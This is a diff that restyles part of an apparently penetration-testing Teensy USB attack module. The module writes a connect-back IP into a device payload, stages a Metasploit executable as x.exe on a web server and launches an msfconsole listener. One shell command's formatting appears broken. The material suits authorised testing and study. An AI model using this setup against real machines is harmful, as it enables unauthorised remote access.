@@ -25,7 +25,7 @@ msf_path = core.meta_path()
 
 # check operating system
 operating_system = core.check_os()
-now = datetime.datetime.today()
+now = datetime.datetime.now()
 if operating_system != "windows":
     import pexpect
 
@@ -43,14 +43,9 @@ with open("/etc/setoolkit/set.config") as fileopen:
 for line in apache_check:
     # strip \r\n
     line = line.rstrip()
-    # if apache is turned on get things ready
-    match = re.search("APACHE_SERVER=ON", line)
-    # if its on lets get apache ready
-    if match:
+    if match := re.search("APACHE_SERVER=ON", line):
         for line2 in apache_check:
-            # set the apache path here
-            match2 = re.search("APACHE_DIRECTORY=", line2)
-            if match2:
+            if match2 := re.search("APACHE_DIRECTORY=", line2):
                 line2 = line2.rstrip()
                 apache_path = line2.replace("APACHE_DIRECTORY=", "")
                 apache = True
@@ -58,40 +53,33 @@ for line in apache_check:
 # grab info from config file
 
 with open(os.path.join(core.userconfigpath, "teensy")) as fileopen:
-    counter = 0
     payload_counter = 0
     choice = None
-    for line in fileopen:
+    for counter, line in enumerate(fileopen):
         line = line.rstrip()
         if counter == 0:
             choice = str(line)
-        if counter == 1:
+        elif counter == 1:
             payload_counter = 1
-        counter += 1
-
     if choice != "14":
-        # Open the IPADDR file
-        if core.check_options("IPADDR=") != 0:
-            ipaddr = core.check_options("IPADDR=")
-        else:
+        if core.check_options("IPADDR=") == 0:
             ipaddr = input(core.setprompt(["6"], "IP address to connect back on"))
-            core.update_options("IPADDR=" + ipaddr)
+            core.update_options(f"IPADDR={ipaddr}")
 
+        else:
+            ipaddr = core.check_options("IPADDR=")
     if not os.path.isfile(os.path.join(core.userconfigpath, "teensy")):
         core.print_error("FATAL:Something went wrong, the Teensy config file was not created.")
         core.exit_set()
 
 
 def writefile(filename, now):
-    with open(os.path.join("src/teensy/" + filename)) as fileopen, \
-            open(os.path.join(core.userconfigpath, "reports/teensy_{0}.ino".format(now)), "w") as filewrite:
+    with (open(os.path.join(f"src/teensy/{filename}")) as fileopen, open(os.path.join(core.userconfigpath, "reports/teensy_{0}.ino".format(now)), "w") as filewrite):
 
         for line in fileopen:
-            match = re.search("IPADDR", line)
-            if match:
+            if match := re.search("IPADDR", line):
                 line = line.replace("IPADDR", ipaddr)
-            match = re.search("12,12,12,12", line)
-            if match:
+            if match := re.search("12,12,12,12", line):
                 ipaddr_replace = ipaddr.replace(".", ",", 4)
                 line = line.replace("12,12,12,12", ipaddr_replace)
 
@@ -146,25 +134,44 @@ if payload_counter == 1:
     metasploit_exec_path = os.path.join(core.userconfigpath, "msf.exe")
     if not apache:
 
-        subprocess.Popen("mkdir {0};"
-                         "cp {1} {2} 1> /dev/null 2> /dev/null".format(webclone_path +
-                                                                     metasploit_exec_path +
-                                                                     os.path.join(webclone_path + "x.exe")),
-                         shell=True).wait()
+        subprocess.Popen(
+            (
+                "mkdir {0};"
+                "cp {1} {2} 1> /dev/null 2> /dev/null".format(
+                    (
+                        webclone_path
+                        + metasploit_exec_path
+                        + os.path.join(f"{webclone_path}x.exe")
+                    )
+                )
+            ),
+            shell=True,
+        ).wait()
 
         if operating_system != "windows":
             child = pexpect.spawn("python src/html/web_server.py")
 
     else:
-        subprocess.Popen("cp {0} {1}".format(metasploit_exec_path, os.path.join(webclone_path + "x.exe")), shell=True).wait()
+        subprocess.Popen(
+            "cp {0} {1}".format(
+                metasploit_exec_path, os.path.join(f"{webclone_path}x.exe")
+            ),
+            shell=True,
+        ).wait()
 
     if os.path.isfile(os.path.join(core.userconfigpath, "meta_config")):
         print(core.bcolors.BLUE + "\n[*] Launching MSF Listener...")
-        print(core.bcolors.BLUE + "[*] This may take a few to load MSF..." + core.bcolors.ENDC)
+        print(
+            f"{core.bcolors.BLUE}[*] This may take a few to load MSF...{core.bcolors.ENDC}"
+        )
         try:
             if operating_system != "windows":
-                child1 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(msf_path + "msfconsole"),
-                                                                   os.path.join(core.userconfigpath, "meta_config")))
+                child1 = pexpect.spawn(
+                    "{0} -r {1}\r\n\r\n".format(
+                        os.path.join(f"{msf_path}msfconsole"),
+                        os.path.join(core.userconfigpath, "meta_config"),
+                    )
+                )
                 child1.interact()
         except:
             if operating_system != "windows":
